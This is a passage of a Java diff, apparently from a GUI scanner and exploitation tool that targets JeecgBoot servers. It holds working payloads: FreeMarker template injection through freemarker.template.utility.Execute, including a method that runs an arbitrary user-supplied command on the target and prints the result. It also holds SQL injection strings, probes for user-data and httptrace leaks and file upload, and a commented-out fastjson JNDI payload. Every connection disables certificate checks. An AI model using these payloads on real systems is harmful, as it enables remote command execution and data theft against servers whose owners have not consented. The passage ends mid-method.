+                    .sslSocketFactory(OkHttpssl.getIgnoreInitedSslContext().getSocketFactory(), OkHttpssl.IGNORE_SSL_TRUST_MANAGER_X509)
+                    .hostnameVerifier(OkHttpssl.getIgnoreSslHostnameVerifier())
+                    .build();
+            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
+            Request request = new Request.Builder()
+                    .url(url + "/jeecg-boot/jmreport/qurestSql")
+                    .post(requestBody)
+                    .build();
+
+            Response response = client.newCall(request).execute();
+
+            String responseBody = response.body().string();
+            if (responseBody.contains("54375177f16b0d71")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-queryTableData-sqli注入漏洞" + "\n");
+                // test2.appendText(response.toString());
+
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  e.printStackTrace();
+
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞-" + "\n");
+        }
+
+
+    }
+
+
+    public void jeecgrcedfs() {
+
+
+        try {
+
+
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+
+            //     String url1 = test1.getText();
+
+            String params = urldf.getText();
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            OkHttpClient client = new OkHttpClient.Builder()
+                    .sslSocketFactory(OkHttpssl.getIgnoreInitedSslContext().getSocketFactory(), OkHttpssl.IGNORE_SSL_TRUST_MANAGER_X509)
+                    .hostnameVerifier(OkHttpssl.getIgnoreSslHostnameVerifier())
+                    .build();
+            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
+
+            Request request = new Request.Builder()
+
+                    .url(url + "/jeecg-boot/jmreport/loadTableData")
+
+
+                    .post(requestBody)
+                    .build();
+
+            Response response = client.newCall(request).execute();
+
+            String responseBody = response.body().string();
+            if (responseBody.contains("888888")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+                test2.appendText(response.toString());
+
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //  e.printStackTrace();
+
+            test2.appendText(formattedDateTime + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-" + "\n");
+            System.out.println(e);
+        }
+
+
+    }
+
+    public void ssi(String line) {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+            // System.setProperty("http.proxyHost", "127.0.0.1");
+            //   System.setProperty("http.proxyPort", "8080");
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            URL url1 = new URL(line + "/jeecg-boot/jmreport/loadTableData");
+            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+            //    test1.appendText(response.toString());
+            if (response.toString().contains("888888")) {
+
+                test3.appendText(formattedDateTime + line + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+                test3.appendText(response.toString());
+
+            } else {
+
+                //    test3.appendText(formattedDateTime + line + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            //   test3.appendText(formattedDateTime + line + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-" + "\n");
+        }
+
+
+    }
+
+    public void ssik() {
+
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+            // System.setProperty("http.proxyHost", "127.0.0.1");
+            //   System.setProperty("http.proxyPort", "8080");
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            URL url1 = new URL(url + "/jeecg-boot/jmreport/loadTableData");
+            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+            //    test1.appendText(response.toString());
+            if (response.toString().contains("888888")) {
+
+                test2.appendText(formattedDateTime + url + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+                test2.appendText(response.toString());
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞" + "\n");
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-" + "\n");
+        }
+
+
+    }
+
+    public void jeecguser() {
+
+        try {
+
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+
+            URL url1 = new URL(url + "/jeecg-boot/sys/user/querySysUser?username=admin");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (age == 0) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞" + "\n");
+                test2.appendText(formattedDateTime + url + "/jeecg-boot/sys/user/querySysUser?username=admin" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞" + "\n");
+
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-" + "\n");
+            test2.appendText("默认接口jeecg-boot判断未发现漏洞，如果抓取到新接口，可输入接口进行精准判断,接口不包含url");
+            zhua();
+
+
+        }
+
+    }
+
+    public void zhua() {
+
+
+        try {
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            URL url1 = new URL(url);
+
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+
+
+            //     System.out.println("Response Code : " + responseCode);
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            int responseCode = connection.getResponseCode();
+            //    System.out.println("Response Code : " + responseCode);
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+                response.append(inputLine);
+                //       br.close();
+
+            }
+
+
+            //    urltest1.appendText(response.toString());
+            Pattern pattern = Pattern.compile("window._CONFIG\\['domianURL'\\] = \\'(.*?);");
+            Matcher matcher = pattern.matcher(response);
+            if (matcher.find()) {
+                String value = matcher.group(1); // 提取匹配的值（这里是name的值）
+
+                test2.appendText("\n" + "抓取到接口:" + value + "\n");
+                //  value=testdff.getText();
+                // jeecguser();
+
+
+            } else {
+                test2.appendText("\n" + "接口抓取失败" + "\n");
+
+
+            }
+
+
+        } catch (Exception e) {
+
+            //   urltest1.appendText("\n" + "暴力抓取出错" + "\n");
+
+        }
+    }
+
+    public void jeecgusergfhf() {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            URL url1 = new URL(url + "/jeecg-boot/sys/user/checkOnlyUser?username=admin");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (age == 0) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞" + "\n");
+                test2.appendText(formattedDateTime + url + "/jeecg-boot/sys/user/checkOnlyUser?username=admin" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞" + "\n");
+
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-" + "\n");
+
+
+        }
+
+
+    }
+
+    public void jeecghttp() {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            URL url1 = new URL(url + "/jeecg-boot/actuator/httptrace/");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            //    String jsonStr = response.toString();
+            //  JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            //   int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (response.toString().contains("x-real-ip")) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot-httptrace信息泄露漏洞" + "\n");
+                test2.appendText(formattedDateTime + url + "/jeecg-boot/actuator/httptrace/" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-httptrace信息泄露漏洞" + "\n");
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot-httptrace信息泄露漏洞-" + "\n");
+
+
+        }
+
+
+    }
+
+    public void jeecgipload() {
+
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+            //  配置认证管理器
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            String url = test1.getText();
+            if (url.endsWith("/")) {
+                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+            }
+            URL url1 = new URL(url + "/jeecg-boot/jmreport/upload");
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestMethod("GET");
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+
+                response.append(inputLine);
+                //    test1.appendText(response.toString());
+
+
+            }
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            // 查找名为"name"的值
+            int age = jsonObject.optInt("code");
+
+
+            //    String jsonStr = response.toString();
+            //  JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            //   int age = jsonObject.optInt("code");
+
+
+            //  int responseCode = connection.getResponseCode();
+            if (age == 405) {
+
+                test2.appendText(formattedDateTime + url + "[+]存在jeecg-boot jmreport任意文件上传漏洞" + "\n");
+                //   test2.appendText(formattedDateTime + url + "/jeecg-boot/actuator/httptrace/" + "\n");
+
+            } else {
+
+                test2.appendText(formattedDateTime + url + "[-]不存在jeecg-boot jmreport任意文件上传漏洞" + "\n");
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            test2.appendText(formattedDateTime + "[-]不存在jeecg-boot jmreport任意文件上传漏洞-" + "\n");
+
+
+        }
+
+    }
+
+    public void jeecgssicmd() {
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        }
+        try {
+
+            HostnameVerifier hv = new HostnameVerifier() {
+                @Override
+                public boolean verify(String urlHostName, SSLSession session) {
+                    return true;
+                }
+            };
+
+            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+            SSLContext sc = SSLContext.getInstance("SSL");
+            SSLSessionContext sslsc = sc.getServerSessionContext();
+            sslsc.setSessionTimeout(0);
+            sc.init(null, trustAllCerts, null);
+            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+
+            HttpsURLConnection.setDefaultHostnameVerifier(hv);
+            // System.setProperty("http.proxyHost", "127.0.0.1");
+            //   System.setProperty("http.proxyPort", "8080");
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            URL url1 = new URL(url + "/jeecg-boot/jmreport/loadTableData");
+            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"" + cmd1.getText() + "\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
+            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+            connection.setDoOutput(true);
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            byte[] input = json.getBytes(StandardCharsets.UTF_8);
+            OutputStream os = connection.getOutputStream();
+            os.write(input, 0, input.length);
+            os.flush();
+            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            StringBuffer response = new StringBuffer();
+            String inputLine;
+            response.append(inputLine = br.readLine());
+            while ((inputLine = br.readLine()) != null) {
+            }
+            response.append(inputLine);
+            //    test1.appendText(response.toString());
+
+
+            String jsonStr = response.toString();
+            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
+            JSONObject result = (JSONObject) jsonObject.get("result");
+            JSONArray fieldList = (JSONArray) result.get("records");
+            for (Object field : fieldList) {
+                if (field instanceof JSONObject) {
+                    JSONObject fieldObject = (JSONObject) field;
+                    testss.appendText(((JSONObject) field).toString());
+
+                } else {
+
+                    testss.appendText(formattedDateTime + "命令执行失败" + "\n");
+                }
+
+            }
+
+
+        } catch (Exception e) {
+            LocalDateTime now = LocalDateTime.now();
+            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+            String formattedDateTime = now.format(formatter);
+            testss.appendText(formattedDateTime + "命令执行失败" + "\n");
+        }
+
+
+    }
+
+    public void jeecgquery(String line) {
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        } else {
+
+
+            try {
+
+                HostnameVerifier hv = new HostnameVerifier() {
+                    @Override
+                    public boolean verify(String urlHostName, SSLSession session) {
+                        return true;
+                    }
+                };
+                //  配置认证管理器
+                TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
+                SSLContext sc = SSLContext.getInstance("SSL");
+                SSLSessionContext sslsc = sc.getServerSessionContext();
+                sslsc.setSessionTimeout(0);
+                sc.init(null, trustAllCerts, null);
+                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
+//  激活主机认证
+                HttpsURLConnection.setDefaultHostnameVerifier(hv);
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jeecg-boot/jmreport/qurestSql");
+                String json = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(jeecg))),1)) or '%%' like '\"}";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
+                writer.write(json);
+                writer.close();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+                }
+
+                int responseCode = connection.getResponseCode();
+
+
+                if (response.toString().contains("54375177f16b0d71")) {
+
+
+                    test3.appendText(formattedDateTime + line + "[+]存在jeecg-boot-queryTableData-sqli注入漏洞" + "\n");
+                    //      test2.appendText(fieldName.toString() + "\n");
+
+
+                } else {
+
+                    //   test2.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞" + "\n");
+                }
+
+
+            } catch (Exception e) {
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                //  test2.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-" + "\n");
+                //     System.out.println(e);
+
+            }
+
+
+        }
+    }
+
+    public void jeecgsql(String line) {
+
+        String url = test1.getText();
+        if (url.endsWith("/")) {
+            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
+        } else {
+
+
+            try {
+
+                LocalDateTime now = LocalDateTime.now();
+                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                String formattedDateTime = now.format(formatter);
+                Random random = new Random();
+                int randomNumber = random.nextInt(100);
+
+                URL url1 = new URL(url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js");
+                String json = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(jeecg))),1)) or '%%' like '\"}";
+                //   String json = "{\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://" + randomNumber + "." + ml.getText() + "\", \"autoCommit\": true}";
+                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
+                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
+                connection.setDoOutput(true);
+                connection.setRequestMethod("POST");
+                // String a;
+                //      ml.setText(randomNumber + "." + ml.getText());
+                //  String a;
+                //   a = ml.getText();
+
+                connection.setRequestProperty("Content-Type", "application/json");
+                byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
+                writer.write(json);
+                writer.close();
+                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                //  byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                //  OutputStream os = connection.getOutputStream();
+                //   os.write(input, 0, input.length);
+                //   os.flush();
+                //   BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                StringBuffer response = new StringBuffer();
+                String inputLine;
+                response.append(inputLine = br.readLine());
+                while ((inputLine = br.readLine()) != null) {
+                    response.append(inputLine);
+                }
+
+                int responseCode = connection.getResponseCode();
+
+
+                if (response.toString().contains("create_by")) {
+
+
+                    test3.appendText(formattedDateTime + line + "[+]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞" + "\n");
+                    //      test2.appendText(fieldName.toString() + "\n");
+
+
+                } else {
+
